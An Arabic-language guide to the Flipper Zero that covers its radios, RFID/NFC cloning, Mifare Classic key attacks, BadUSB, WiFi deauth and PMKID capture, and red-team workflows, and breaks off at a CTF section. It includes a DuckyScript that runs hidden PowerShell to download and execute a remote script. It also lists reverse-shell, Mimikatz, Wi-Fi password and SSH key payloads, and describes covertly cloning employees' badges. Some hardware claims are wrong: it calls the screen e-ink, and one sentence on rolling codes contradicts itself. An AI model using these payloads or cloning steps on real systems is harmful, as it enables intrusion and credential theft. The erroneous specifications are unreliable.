**Flipper Zero** هو أشهر جهاز متعدد الأدوات في مجتمع الأمن العملي. يتسع في الجيب، ويبلغ سعره نحو 170 دولارًا، ويجمع راديو Sub-GHz وقارئ RFID بتردد 125 كيلوهرتز وهوائي NFC وجهاز إرسال واستقبال للأشعة تحت الحمراء ومنفذ iButton وراديو Bluetooth ورأس توسعة GPIO ومنفذ USB في جهاز صغير يمكن تثبيته بحلقة مفاتيح. يغطي هذا الدليل جميع إمكاناته، من فتح العلبة إلى مسارات عمل الفريق الأحمر المتقدمة.

*اقرأ الأقسام بالترتيب إذا كنت جديدًا على Flipper Zero. انتقل مباشرة إلى القسم الذي تحتاجه إذا كنت تملكه وتريد التعمق في نظام فرعي محدد.*

## نظرة عامة على الأجهزة

يعمل **Flipper Zero** بوحدة تحكم دقيقة STM32WB55. وهي شريحة Arm Cortex-M4 / Cortex-M0+ ثنائية النواة، وتضم راديو Bluetooth 5.0. يعمل التطبيق الرئيسي على نواة M4 بسرعة تصل إلى 64 ميغاهرتز، بينما تتولى نواة M0+ إدارة مكدس Bluetooth.

| المكوّن | التفاصيل |
|-----------|---------|
| **MCU** | STM32WB55RGV6، Cortex-M4 بسرعة 64 MHz + Cortex-M0+ |
| **الفلاش** | ذاكرة داخلية 1 MB + ذاكرة SPI NOR خارجية بسعة 256 Mbit |
| **RAM** | SRAM بسعة 256 KB |
| **الشاشة** | شاشة حبر إلكتروني 1.4 بوصة (128x64)، تعمل دائمًا |
| **راديو Sub-GHz** | جهاز إرسال واستقبال CC1101، من 300 إلى 928 MHz |
| **RFID** | واجهة أمامية تناظرية بتردد 125 kHz (EM4100 وHID وIndala وغيرها) |
| **NFC** | ST25R3916B، ‏13.56 MHz ISO 14443A/B و15693 |
| **الأشعة تحت الحمراء** | LED إرسال بتردد 940 nm + مستشعر استقبال TSOP75338 |
| **iButton** | واجهة 1-Wire، مفاتيح DS1990A وذاكرة اللمس |
| **Bluetooth** | BLE 5.0 (مدمج في STM32WB55) |
| **GPIO** | رأس ذو 18 سنًا: SPI وI2C وUART وطاقة 5V/3.3V وADC |
| **USB** | USB-C ودعم جهاز HID (BadUSB / U2F) |
| **البطارية** | Li-Po بسعة 2000 mAh، شحن USB-C، نحو 30 ساعة في الاستخدام المعتاد |
| **MicroSD** | حتى 128 GB، بنظام FAT32 أو exFAT |

لا تستهلك **شاشة الحبر الإلكتروني** طاقة أثناء عرض صورة ثابتة. لذلك تدوم البطارية مدة ممتازة فعلًا عند ترك الجهاز في وضع الاستعداد.

**CC1101** شريحة إرسال واستقبال Sub-GHz متعددة الأغراض من Texas Instruments، وتغطي النطاقات 300–348 MHz و387–464 MHz و779–928 MHz. وتمنح قابليتها للبرمجة وحدة Sub-GHz مرونة كبيرة.

## خيارات البرامج الثابتة

يمكنك تشغيل **البرنامج الثابت الرسمي لـ Flipper Zero** أو أحد التفرعات المجتمعية الشائعة. يفتح كل تفرع ميزات تقيدها Flipper Devices لأسباب تنظيمية وقانونية.

| البرنامج الثابت | الوصف | الميزات المتاحة |
|----------|-------------|-------------|
| **Official** | البرنامج القياسي من Flipper Devices | إعدادات افتراضية محافظة وأكثر أمانًا |
| **Unleashed** | أشهر تفرع ويركز على الاستقرار | جميع ترددات Sub-GHz وبروتوكولات إضافية |
| **Xtreme** | غني بالميزات ويجري تحديثه باستمرار | واجهة مخصصة وتطبيقات إضافية وفتح Sub-GHz |
| **RogueMaster** | يضم مجموعة تطبيقات من جهات خارجية | أكبر حزمة تطبيقات جاهزة للاستخدام |

ثبّت أي تفرع بتمريره عبر تطبيق **qFlipper** المكتبي على Windows أو macOS أو Linux، أو بنسخ ملف `.dfu` إلى بطاقة SD واستخدام قائمة التحديث في الجهاز.

*يُعد Unleashed نقطة بداية آمنة للبحث. يفضّل Xtreme من يريد أكبر مجموعة ميزات. استخدم البرنامج الرسمي أثناء السفر لتقليل التدقيق القانوني.*

## راديو Sub-GHz

تحصل وحدة Sub-GHz على أكبر قدر من الاهتمام. فهي تتيح تسجيل الإشارات وتحليلها وإعادة إرسالها وبثها ضمن نطاقات التردد التي تستخدمها أبواب المرائب ومفاتيح السيارات وأجراس الأبواب ومحطات الطقس اللاسلكية ومقابس الطاقة ومئات الأجهزة الأخرى.

### نطاقات التردد المدعومة

- **300–348 MHz** — أجهزة تحكم قديمة وبعض أنظمة أبواب المرائب في الولايات المتحدة
- **387–464 MHz** — أجهزة أوروبية وأمريكية؛ ويُعد 433.92 MHz أكثر نطاقات ISM شيوعًا عالميًا
- **779–928 MHz** — ‏868 MHz في أوروبا، و915 MHz ضمن نطاق ISM الأمريكي، و868 MHz LoRa

### أنماط التضمين الشائعة

| التضمين | معناه |
|------------|---------------|
| **AM (ASK/OOK)** | تضمين إزاحة السعة؛ إشارة تشغيل/إيقاف بسيطة تستخدمها معظم أجهزة التحكم البسيطة. |
| **FM (FSK/2-FSK)** | تضمين إزاحة التردد؛ تستخدمه محطات الطقس وبعض مفاتيح السيارات. |
| **APSK** | مزيج من الأنماط؛ تستخدمه قلة من الأجهزة الذكية. |

يفك Flipper إشارات OOK الخام تلقائيًا. يعرضها بصريًا على الشاشة ويتيح إعادة إرسالها بضغطة زر. وهذا ما جعل Flipper Zero مشهورًا؛ إذ يسهل للغاية **إعادة إرسال الشفرات الثابتة، بينما يصعب التعامل مع الشفرات المتغيرة** على الأجهزة التي لا تستخدم الشفرات المتغيرة.

### الشفرات المتغيرة مقابل الشفرات الثابتة

ترسل أجهزة **الشفرات الثابتة** الإشارة نفسها في كل مرة. يسجل Flipper Zero الإشارة مرة واحدة ثم يعيد إرسالها عند الحاجة. تستخدم معظم مقابس الطاقة اللاسلكية وأجراس الأبواب وأبواب المرائب القديمة شفرات ثابتة.

تغيّر أجهزة **الشفرات المتغيرة** (KeeLoq وAUT64 وغيرها) الشفرة بعد كل استخدام. لا يمكن إعادة إرسال الإشارة الملتقطة مباشرة. وتكون الهجمات على أنظمة الشفرات المتغيرة أعقد، وتتطلب أدوات متخصصة وتوقيتًا قريبًا. لا يستطيع Flipper Zero تجاوز الشفرات المتغيرة الحديثة مباشرةً من العلبة.

*اختبر الأجهزة التي تملكها فقط. تُعد الأجهزة ذات الشفرات الثابتة في منزلك هدفًا تعليميًا ممتازًا.*

### سير عمل Sub-GHz

1. افتح **Sub-GHz** من القائمة الرئيسية.
2. اختر **Read** (لقراءة الإشارة والتقاطها) لالتقاط إشارة. وجّه الجهاز نحو وحدة التحكم واضغط زرها.
3. يفك Flipper الإشارة ويعرض التردد والتضمين ونمط البتات الخام.
4. اضغط **Save** (لحفظ الإشارة) لحفظها على بطاقة SD.
5. اضغط **Send** (لإعادة إرسال الإشارة) أو افتح الملف المحفوظ لاحقًا لإعادة الإرسال.

يتيح وضع **Frequency Analyzer** (محلل الترددات) مسح الطيف بصورة سلبية ومعرفة الترددات النشطة. ويساعد ذلك في العثور على أجهزة إرسال غير معروفة.

### هجمات القوة الغاشمة

يمكن لـ Flipper تنفيذ تسلسل **قوة غاشمة** للبروتوكولات ذات مساحة مفاتيح صغيرة، مثل مفاتيح السيارات القديمة التي تستخدم شفرة ثابتة من 12 أو 24 بت، وتجربة كل الشفرات الممكنة. ينجح هذا مع الأجهزة القديمة جدًا أو الرخيصة، ولا يفيد مطلقًا ضد الشفرات المتغيرة أو مساحات المفاتيح الطويلة.

تتضمن البرامج الثابتة المخصصة قواميس إضافية للقوة الغاشمة وتسلسلات هجوم لبعض الشركات. ومن التسلسلات الشائعة **Came 12bit** و**Nice 12bit** و**Linear 8bit** و**Holtek 12bit**.

## RFID (التردد المنخفض 125 kHz)

تقرأ وحدة **RFID بتردد 125 kHz** بطاقات القرب منخفضة التردد وتكتب عليها. تُستخدم هذه البطاقات والمفاتيح في أنظمة التحكم القديمة بالدخول وشرائح تعريف الحيوانات والتتبع الصناعي.

### أنواع البطاقات المدعومة

| نوع البطاقة | ملاحظات |
|-----------|-------|
| **EM4100 / EM4102** | الأكثر شيوعًا، للقراءة فقط بسعة 64 بت. توجد في أنظمة دخول رخيصة حول العالم. |
| **HID Prox** | شائعة في أنظمة التحكم التجاري بالدخول (HID Global H10301 وإصداراتها). |
| **Indala Prox** | تنسيق Motorola / Indala للأنظمة القديمة. |
| **IoProx** | تنسيق Kantech IoProx، شائع أيضًا في المباني التجارية بأمريكا الشمالية. |
| **FDX-B (ISO 11784/11785)** | معيار شرائح تعريف الحيوانات. |
| **Pyramid** | من Farpointe Data؛ يشبه Indala. |
| **Viking** | أقل شيوعًا، تستخدمه بعض الأنظمة الأوروبية. |

### قراءة بطاقة LF

أبقِ الحافة العلوية من Flipper، حيث يوجد الهوائي، على بعد بضعة سنتيمترات من البطاقة أو المفتاح. انتقل إلى **125 kHz RFID > Read** (مسار قراءة بطاقة RFID منخفضة التردد). يقرأ خيار Read (قراءة) بطاقة LF ويعرض معرّفها. يقرأ الجهاز المعرّف خلال ثانية أو ثانيتين ويعرض رمز المنشأة ورقم البطاقة.

### المحاكاة والاستنساخ

بعد القراءة، احفظ البطاقة ثم **حاكها** لاحقًا باختيار الملف المحفوظ والضغط على الزر. يبث Flipper معرّف البطاقة ليبدو للقارئ كأنه البطاقة الأصلية.

يمكنك أيضًا **كتابة** المعرّف على بطاقة T5577 فارغة قابلة للكتابة. بطاقات T5577 رخيصة (نحو 0.50 دولار للواحدة) وتدعم معظم تنسيقات التردد المنخفض.

*يُعد استنساخ بطاقات دخول لا تملكها أو لا تملك إذنًا لاختبارها جريمة في معظم الولايات القضائية. احصل دائمًا على تفويض مكتوب قبل اختبار أي نظام للتحكم بالدخول.*

### قيود RFID منخفض التردد

لا توفر RFID منخفضة التردد حماية تشفيرية. ويمكن لأي شخص يحمل قارئًا قريبًا منك قراءة معرّف بطاقتك. تستخدم وسائل الأمن المادي الحديثة البطاقات الذكية عالية التردد (NFC بتردد 13.56 MHz) مع مصادقة متبادلة.

## NFC (التردد العالي 13.56 MHz)

تستخدم **وحدة NFC** شريحة ST25R3916B وتدعم ISO 14443A وISO 14443B وISO 15693. يُستخدم هذا التردد في بطاقات الدفع اللاتلامسي وبطاقات النقل العام والبطاقات الذكية لدخول المباني ووسوم NFC.

### المعايير المدعومة

| المعيار | الاستخدام الشائع |
|----------|-----------|
| **ISO 14443A** | Mifare Classic وMifare DESfire وNXP NTAG وبطاقات الائتمان/الخصم |
| **ISO 14443B** | بعض الهويات الحكومية وجوازات السفر (الطبقة الخارجية) |
| **ISO 15693** | وسوم المكتبات وبعض RFID الصناعي |
| **EMV (المستوى 1)** | قراءة بيانات الدفع اللاتلامسي للبطاقة فقط |
| **NFC-A/B/F/V** (بروتوكولات NFC) | تبادل بيانات NFC عام |

### هجمات Mifare Classic

**Mifare Classic** معيار للبطاقات الذكية بتردد 13.56 MHz، وقد كُسر نظريًا عام 2008. ما زالت أنظمة نقل ودخول قديمة كثيرة تستخدمه. يستطيع Flipper Zero تنفيذ عدة هجمات:

- **Read** (قراءة) — يقرأ جميع القطاعات التي تستخدم مفتاح المصنع الافتراضي (`FFFFFFFFFFFF` أو `A0A1A2A3A4A5`).
- **هجوم القاموس** — يجرّب قائمة بالمفاتيح الشائعة على القطاعات المقفلة. تتضمن البرامج الثابتة المخصصة قواميس مفاتيح كبيرة.
- **الهجوم المتداخل** — يتطلب معرفة مفتاح قطاع واحد على الأقل. يستخدم تحليلًا تشفيريًا قائمًا على التوقيت لاشتقاق مفاتيح قطاعات أخرى.
- **هجوم Darkside** — يعمل حتى دون معرفة أي مفتاح في بعض إصدارات Mifare Classic. يجب وضع Flipper على بعد سنتيمتر من البطاقة.

بعد قراءة جميع القطاعات، احفظ التفريغ الكامل ثم **حاكِ** البطاقة. يحاكيها Flipper كما لو كانت البطاقة الأصلية، بما في ذلك بيانات القطاعات.

*لا تستنسخ بطاقات Mifare Classic التي تحمل رصيدًا حاليًا، مثل أجور النقل أو أرصدة مواقف السيارات، إلا إذا كنت تملك البطاقة والنظام الخلفي وتتحكم بهما.*

### Mifare DESfire والبطاقات الحديثة

تستخدم بطاقات **Mifare DESfire EV1/EV2/EV3** تشفير AES-128 والمصادقة المتبادلة. لا يستطيع Flipper Zero قراءة بياناتها المحمية. يمكنه قراءة UID وقائمة AID، لكنه لا يستطيع الوصول إلى بيانات التطبيقات دون المفاتيح الصحيحة. هذا مقصود؛ فتشفير DESfire آمن على نحو ملائم.

يمكن قراءة بعض البيانات الوصفية المتاحة علنًا من **بطاقات الدفع EMV**، مثل Visa وMastercard وAmex اللاتلامسية؛ وقد تشمل رقم البطاقة في الطرازات القديمة وتاريخ الانتهاء وسجل المعاملات. قلّلت البطاقات الحديثة البيانات التي تكشفها القراءة العامة. لا يستطيع Flipper بدء معاملات دفع حقيقية أو اعتراضها.

### وسوم NFC وNDEF

**NDEF (تنسيق تبادل بيانات NFC)** هو التنسيق القياسي لوسوم NFC المستخدمة في التسويق والتحقق من المنتجات والملصقات الذكية. يستطيع Flipper قراءة وسوم NDEF وحفظها وكتابتها ومحاكاتها. يفيد ذلك في:

- استنساخ وسوم NXP NTAG203 أو NTAG213 لأغراض الاختبار
- كتابة حمولات NDEF مخصصة مثل عناوين URL وبطاقات الاتصال وبيانات Wi-Fi
- محاكاة وسم لتشغيل إجراء على هاتف من دون وجود الوسم المادي

## الأشعة تحت الحمراء (IR)

تتكون وحدة الأشعة تحت الحمراء من LED بتردد 940 nm للإرسال ومزيل تضمين TSOP75338 للاستقبال. وهي تدعم تقريبًا جميع بروتوكولات أجهزة التحكم بالأشعة تحت الحمراء الاستهلاكية.

### البروتوكولات المفكوكة

| البروتوكول | الأجهزة الشائعة |
|----------|---------------|
| **NEC** | الأكثر شيوعًا؛ تستخدمه LG وSamsung وPanasonic وغيرها |
| **RC5** | أجهزة Philips |
| **RC6** | Philips وMicrosoft وأجهزة استقبال الكابل |
| **Samsung32** | أجهزة تلفاز وأنظمة مسرح منزلي من Samsung |
| **NECext** | إصدار موسّع من NEC بعناوين 32 بت |
| **SIRC12 / SIRC15 / SIRC20** | أجهزة Sony |
| **Kaseikyo** | Panasonic وJVC |
| **RCA** | أجهزة التحكم من علامة RCA |

يلتقط Flipper أيضًا **إشارات IR خامًا** ويعيد إرسالها لأي بروتوكول لا يستطيع فك ترميزه. يحفظ الالتقاط الخام توقيت النبضات والفواصل بدقة ويعيد إرسالها بأمانة كاملة.

### جهاز التحكم الشامل

يتيح تطبيق **Universal Remotes** المدمج تصفح قاعدة بيانات لرموز IR مرتبة حسب العلامة التجارية وفئة الجهاز. يمكنك إطفاء أجهزة التلفاز وضبط مستوى مكبرات الصوت والتحكم بوحدات تكييف الهواء دون جهاز تحكم مادي. وتضم مكتبة IR المجتمعية على GitHub (`flipperzero-ir-relay`) آلاف الرموز الإضافية.

*في عمليات الفريق الأحمر أو الهندسة الاجتماعية، يفيد جهاز التحكم الشامل بالأشعة تحت الحمراء في إحداث تشتيت في البيئات التي تحتوي على شاشات مرئية.*

### التقاط إشارة جهاز التحكم الخاص بك

1. انتقل إلى **Infrared > Learn New Remote** (الأشعة تحت الحمراء > تعلّم جهاز تحكم جديد).
2. وجّه جهاز التحكم الأصلي إلى نافذة استقبال IR في Flipper، عند الحافة العلوية.
3. اضغط كل زر تريد التقاطه. يحفظ Flipper كل زر على حدة.
4. سمِّ ملف جهاز التحكم واحفظه.
5. أعد إرسال أي زر من الملف المحفوظ.

## iButton و1-Wire

**iButton** (Dallas/Maxim 1-Wire) بروتوكول يعتمد على التلامس ويُستخدم في بعض أنظمة الدخول المادي وتتبع الأصول واستشعار الحرارة. نقطة iButton هي القرص أو الأسطوانة المعدنية الصغيرة التي تلامس القارئ.

### أنواع المفاتيح المدعومة

| نوع المفتاح | ملاحظات |
|----------|-------|
| **DS1990A** | مفتاح دخول شائع جدًا؛ معرّف فريد 64 بت، للقراءة فقط |
| **DS1992** | مفتاح ذاكرة يتضمن NVRAM بسعة 1 KB |
| **DS1996** | مفتاح ذاكرة يتضمن NVRAM بسعة 64 KB |
| **Cyfral** | تنسيق لأنظمة دخول في أوروبا الشرقية |
| **Metacom** | تنسيق اتصال داخلي أقل شيوعًا |

اقرأ المفتاح بملامسة منفذ iButton في Flipper، أي الوسادات الذهبية عند الحافة السفلية، بالمفتاح. احفظه وحاكه بالطريقة نفسها المستخدمة مع RFID وNFC. ويستطيع Flipper أيضًا كتابة معرّفات المفاتيح على مفاتيح iButton فارغة قابلة للكتابة RW1990.

## GPIO واختراق الأجهزة

يُعد **رأس GPIO ذي 18 سنًا** أعلى Flipper Zero الواجهة الأساسية لمخترقي الأجهزة. وهو يتيح SPI وI2C وUART وADC وخطوط الطاقة.

### توزيع أطراف GPIO

| الطرف | الوظيفة |
|-----|---------|
| **1** | 5V (دخل، من USB فقط عند توصيله) |
| **2, 4** | GND |
| **3** | خرج 3.3V (حد أقصى 20 mA) |
| **5** | PA4 / SPI1_MISO / ADC |
| **6** | PA6 / SPI1_SCK |
| **7** | PA7 / SPI1_MOSI |
| **8** | PA3 / UART TX |
| **9** | PB3 / UART RX |
| **10** | PC3 / ADC |
| **11** | PC1 / ADC |
| **12** | PA0 / ADC |
| **13** | PB2 / GPIO |
| **14** | PE3 / SPI1_CS |
| **15** | PB4 / I2C1_SDA |
| **16** | PB13 / I2C1_SCL |
| **17** | PB14 / GPIO / USART1 TX (تصحيح الأخطاء) |
| **18** | PA8 / GPIO |

*تعمل جميع أطراف GPIO بمنطق 3.3V. لا توصل 5V بأطراف البيانات. استخدم محوّل مستويات مع أجهزة 5V.*

### الوصول إلى وحدة تحكم UART

تترك أجهزة مضمنة كثيرة وحدة تحكم تصحيح UART مفعلة بعد طرحها للإنتاج. يتيح توصيل أطراف UART في Flipper بطرفي UART TX/RX للجهاز المستهدف التفاعل مع وحدة تحكم تسلسلية، وقد يتيح:

- الوصول إلى shell بامتيازات مرتفعة
- مراقبة مخرجات سجل الإقلاع بحثًا عن بيانات الاعتماد ومعلومات النظام
- تمرير برنامج ثابت غير موقّع إذا أمكن الوصول إلى قائمة محمّل الإقلاع

انتقل إلى **GPIO > USB-UART Bridge** (قائمة GPIO لفتح جسر USB إلى UART) أو استخدم تطبيق GPIO لفتح اتصال طرفية. يظهر Flipper على الكمبيوتر المتصل كمنفذ تسلسلي USB، ويصل أطراف UART بالجهاز.

### مستشعرات SPI وI2C

صل أي مستشعر SPI أو I2C، مثل مقياس التسارع أو مستشعر الضغط الجوي أو الحرارة/الرطوبة أو شاشة OLED، مباشرة برأس GPIO. توجد تطبيقات مجتمعية لكثير من الشرائح الشائعة:

- **SSD1306** برنامج تشغيل شاشة OLED
- **BME280** لقياس الحرارة والرطوبة والضغط
- **NRF24L01** وحدة راديو 2.4 GHz (توسّع سطح الهجوم اللاسلكي)
- **CC1101** هوائي خارجي لتحسين المدى على Sub-GHz

### تصحيح JTAG وSWD

يكشف رأس GPIO في Flipper إشارات SWD على بعض الأطراف. وباستخدام محوّل، يمكنك تحويل Flipper إلى **مجس تصحيح JTAG/SWD** لتنفيذ ما يلي:

- إيقاف وحدة MCU المستهدفة مؤقتًا والتنقل بين تعليماتها
- قراءة ذاكرة الفلاش وكتابتها
- استخراج البرنامج الثابت من أجهزة مقفلة باستخدام خلل جهد يتبعه الوصول إلى واجهة التصحيح

هذا مجال متقدم. يجعل منفذ البرنامج الثابت **BlackMagic Probe** لـ Flipper سير العمل عمليًا.

## BadUSB وهجمات USB HID

عند توصيله بكمبيوتر عبر USB-C، يظهر Flipper Zero على أنه **لوحة مفاتيح USB HID**. هذا هو مسار هجوم BadUSB؛ إذ يكتب الجهاز ضغطات المفاتيح تلقائيًا دون تثبيت أي برنامج تشغيل.

### DuckyScript

تستخدم نصوص Flipper BadUSB لغة **DuckyScript**، وهي لغة البرمجة النصية نفسها التي يستخدمها USB Rubber Ducky من Hak5. يوضع النص العادي في `badusb/` على بطاقة SD.

```
REM افتح مربع التشغيل وشغّل PowerShell
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
ENTER
```

من حمولات BadUSB الشائعة:

- **صدفة عكسية** — تفتح اتصالًا شبكيًا عائدًا إلى جهاز المهاجم
- **استخراج بيانات الاعتماد** — يشغّل Mimikatz أو أدوات مماثلة في الذاكرة
- **الاستمرارية** — يضيف إدخال بدء تشغيل أو مهمة مجدولة
- **استخراج كلمة مرور Wi-Fi** — يستخدم `netsh` لتصدير ملفات تعريف الشبكات اللاسلكية المحفوظة
- **حقن مفتاح SSH** — يضيف مفتاح مهاجم إلى `authorized_keys`

### وسائل الدفاع ضد BadUSB

ينجح BadUSB لأن أجهزة الكمبيوتر تثق بلوحات المفاتيح دون شروط. تشمل وسائل الدفاع:

- **USBGuard** (Linux) — السماح بقائمة محددة من أجهزة USB حسب معرّف المورّد/المنتج
- **سياسة مجموعة لقفل USB** (Windows) — تعطيل أجهزة HID من مورّدين غير موجودين في قائمة السماح
- **سدادات المنافذ المادية** — منع إدخال USB في البيئات عالية الأمان
- **كشف نقاط النهاية** — ترصد حلول مثل CrowdStrike حقن ضغطات المفاتيح السريعة بالاستدلال

### مفتاح أمان عتادي U2F

يمكن لـ Flipper Zero العمل أيضًا **كمفتاح أمان عتادي FIDO U2F**. يتضمن البرنامج الرسمي دعم U2F. سجّل Flipper في أي موقع يدعم FIDO U2F، مثل GitHub وGoogle وCloudflare، ثم اضغط الزر الخلفي في Flipper لتأكيد المصادقة.

وهذا يجعل Flipper رمزًا عتاديًا لحساباتك. يخزن مواد المفتاح الخاص في مساحة تخزين آمنة في MCU.

## Bluetooth

تتضمن STM32WB55 تقنية Bluetooth 5.0. يستخدم Flipper BLE في:

- **Flipper Mobile App** — تطبيق iOS وAndroid لإدارة الملفات وتحديث البرامج الثابتة والتحكم عن بُعد
- **BadBT** (تطبيق مجتمعي) — يكتب ضغطات DuckyScript عبر Bluetooth بدل USB، ما يتيح حقن HID لاسلكيًا على الأجهزة المقترنة
- **ماسح BLE** — مسح سلبي لإعلانات BLE القريبة؛ مفيد لجرد أجهزة إنترنت الأشياء في المبنى

مدى Bluetooth محدود (نحو 10–30 مترًا في الأماكن المفتوحة). يكفي ذلك لتوصيل BadUSB لاسلكيًا من حقيبة أو جيب عند الوقوف قرب محطة عمل مستهدفة.

### إقران تطبيق الهاتف

1. نزّل **Flipper Mobile App** من App Store أو Google Play.
2. على Flipper، انتقل إلى **Settings > Bluetooth > Pair Phone** (قائمة إعدادات Bluetooth لإقران الهاتف).
3. افتح التطبيق واتبع طلب الإقران.
4. استخدم التطبيق لتصفح بطاقة SD وتثبيت التطبيقات من الكتالوج وبث بيانات المستشعرات.

## التعمق في البرامج الثابتة المخصصة

### برنامج Unleashed الثابت

**Unleashed** (متاح على github.com/DarkFlippers/unleashed-firmware) هو أكثر التفرعات المجتمعية تحفظًا. يزيل القيود الجغرافية على ترددات Sub-GHz ويضيف دعمًا موسعًا للبروتوكولات مع الحفاظ على قربه من قاعدة الشفرة الرسمية. الاستقرار هو الأولوية.

أهم الإضافات مقارنة بالبرنامج الرسمي:

- نطاق تردد Sub-GHz موسع (300–928 MHz دون قيود)
- بروتوكولات Sub-GHz إضافية مثل CAME وNice وDoorHan وغيرها
- بروتوكولات NFC إضافية
- دعم موسع لـ DuckyScript في BadUSB
- قاعدة بيانات أكبر للأشعة تحت الحمراء

### برنامج Xtreme الثابت

يضيف **Xtreme** (متاح على github.com/Flipper-XFW/Xtreme-Firmware) نظام أصول مخصصًا كاملًا فوق ميزات Unleashed. يمكنك تغيير اسم Flipper وشاشة البداية ورسوم سطح المكتب وسلوك LED. كما توسعت قائمة الإعدادات كثيرًا.

ميزات إضافية:

- App Hub مع تطبيقات مختارة من جهات خارجية
- حمولات هجوم Sub-GHz وNFC موسعة
- برمجة LED RGB
- تحسينات إدارة الملفات

### RogueMaster

يجمع **RogueMaster** أكبر مجموعة من تطبيقات وأدوات المجتمع، بما فيها أدوات تجريبية أو تنطوي على مخاطر بحسب الحالة. وهو أقل استقرارًا من Unleashed أو Xtreme، لكنه يوفر أكبر عدد من الأدوات في تثبيت واحد.

### تمرير أي برنامج ثابت

```bash
# باستخدام واجهة qFlipper CLI
qFlipper cli -c firmware /path/to/firmware.dfu

# أو ضع firmware.zip في جذر بطاقة SD، ثم:
# الإعدادات > تحديث البرنامج الثابت > تحديث من بطاقة SD (Settings > Firmware Update > Update from SD Card)
```

*انسخ محتويات بطاقة SD احتياطيًا دائمًا قبل تحديث البرنامج الثابت. لا تمحو عملية التحديث البطاقة، لكن النسخ الاحتياطي ممارسة جيدة.*

## الملحقات وتوسعات الأجهزة

### لوحة WiFi Dev

تتصل **لوحة WiFi Dev** مباشرة برأس GPIO في Flipper. وتضم ESP32-S2 يشغّل برنامج **WiFi Marauder** الثابت. وتضيف قدرات 802.11 b/g/n كاملة:

- **مسح SSID** — حصر جميع نقاط الوصول القريبة
- **إغراق Beacon** — بث عشرات معرّفات SSID المزيفة لإرباك الأجهزة وإحداث تشويش مرئي
- **هجوم deauth** — إرسال إطارات إلغاء مصادقة 802.11 لفصل الأجهزة عن نقطة وصول
- **التقاط Probe** — التقاط طلبات الاستكشاف للتعرف على الأجهزة ومعرّفات SSID التي تتذكرها
- **هجوم WPS** — البحث عن الموجّهات المفعّل عليها WPS ومحاولة حصر أرقام PIN (ببطء)
- **التقاط PMKID** — التقاط تجزئات PMKID لكسرها دون اتصال، من غير حاجة إلى عميل

تتحكم في لوحة WiFi Dev عبر شاشة Flipper وأزراره. لا حاجة إلى هاتف أو كمبيوتر.

*إرسال إطارات إلغاء المصادقة إلى شبكات لا تملكها مخالف لـ Computer Fraud and Abuse Act (CFAA) في الولايات المتحدة وللقوانين المكافئة في معظم البلدان. استخدم ذلك في مختبر مصرح به فقط.*

### وحدة ألعاب الفيديو

تحتوي **وحدة ألعاب الفيديو** على RP2040 وبطارية صغيرة قابلة لإعادة الشحن. تتصل برأس GPIO وتضيف إمكانات ألعاب لاسلكية متعددة اللاعبين. ويمكنها أيضًا العمل كمتحكم دقيق مستقل لتشغيل شيفرة مخصصة تخفف الحمل عن STM32 الرئيسي.

### وحدة ESP32 WROOM (DIY)

توسع وحدة **ESP32-WROOM-32** القياسية، عند توصيلها بـ Flipper عبر UART أو SPI، سطح الهجوم أكثر:

- WiFi كامل بمعيار 802.11 وبرنامج ثابت مخصص
- Bluetooth Classic بتردد 2.4 GHz وBLE في الوقت نفسه مع BLE الخاص بـ Flipper
- توسعة GPIO خارجية
- واجهة خادم ويب للتحكم عن بعد أثناء عمليات الاختبار المادي

### محوّل رأس Raspberry Pi Zero 2W

تصل محوّلات صممها المجتمع **Raspberry Pi Zero 2W** برأس GPIO في Flipper. يشغل Pi بيئة Linux كاملة ويتواصل مع Flipper عبر UART أو USB تسلسلي. ويُستخدم في:

- تسجيل البيانات لمدة طويلة
- تشغيل Bettercap أو Kismet للاستطلاع الشبكي
- العمل كمرحل C2 أثناء عمليات الفريق الأحمر
- تخزين التقاطات كبيرة قد تتجاوز سعة بطاقة microSD

## مسارات عمل اختبار الاختراق

### سير عمل تجاوز الدخول المادي

1. استخدم **قارئ RFID بتردد 125 kHz** لقراءة بطاقات الموظفين أثناء وجودك بالقرب منهم بصورة عادية في الردهة.
2. استنسخ البطاقة على بطاقة T5577 فارغة أو حاكها مباشرة من Flipper.
3. استخدم البطاقة المستنسخة لدخول المناطق المؤمّنة.
4. وثّق القارئات التي قبلت بيانات الاعتماد المستنسخة وأبلغ العميل.

يختبر ذلك ما إذا كانت المنشأة تعتمد EM4100 (غير آمن وقابل للاستنساخ) أو بطاقات NFC ذكية حديثة (أصعب في الاستنساخ).

### جرد الأجهزة اللاسلكية

1. تجوّل في المنشأة المستهدفة مع تشغيل **Sub-GHz Frequency Analyzer** (محلل ترددات دون الغيغاهرتز).
2. سجّل جميع الترددات النشطة وأنواع الإشارات.
3. استخدم وضع **Read** (لقراءة الإشارة والتقاطها) لالتقاط الإشارات والتعرف عليها من أجهزة مثل مستشعرات إنذار لاسلكية وحواجز مواقف السيارات ووحدات التحكم في التدفئة والتهوية وتكييف الهواء.
4. أبلغ عن جميع الأجهزة ذات الشفرات الثابتة بوصفها نتائج عالية الخطورة.

### مسح RFID

1. استخدم وضع **NFC > Detect Reader** ليعمل Flipper كبطاقة ويكتشف القارئات الموجودة دون حمل أي بيانات اعتماد.
2. حدد أنواع القارئات، مثل الداعمة لـ Mifare Classic أو DESfire أو ISO 15693، لتقييم مستوى أمان كل نقطة دخول.

### محاكاة هجوم إسقاط BadUSB

1. حمّل مسبقًا حمولة DuckyScript على بطاقة SD في Flipper.
2. اترك Flipper موصولًا بمحطة عمل غير مقفلة (يتطلب ذلك وصولًا ماديًا).
3. ينفذ النص تلقائيًا: يحصر المضيف ويستخرج بيانات الاعتماد وينشئ اتصالًا عكسيًا.
4. وثّق زمن التنفيذ ومعدلات الاكتشاف.

يختبر ذلك سياسات المؤسسة للتحكم بأجهزة USB وتغطية اكتشاف نقاط النهاية.

### اختبار مستشعرات الإنذار اللاسلكية

ترسل مستشعرات الأبواب والنوافذ اللاسلكية كثيرًا إشارات OOK بسيطة ضمن Sub-GHz. إذا استخدمت شفرات ثابتة:

1. **سجّل** إشارة المستشعر (يُفعّلها فتح نافذة في بيئة اختبار مصرح بها).
2. **أعد إرسال** الإشارة لمحاكاة تشغيل المستشعر دون فتح النافذة فعليًا.
3. تحقّق مما إذا كان نظام الإنذار يصدر تنبيهًا.

يوضح ذلك ما إذا كان بوسع مهاجم تجاوز مستشعرات المحيط اللاسلكية بجهاز سعره 170 دولارًا.

## استخدامات CTF والمسابقات

يظهر Flipper Zero في مسابقات **Capture The Flag** ضمن فئات الأمن المادي. وتشمل التحديات الشائعة:

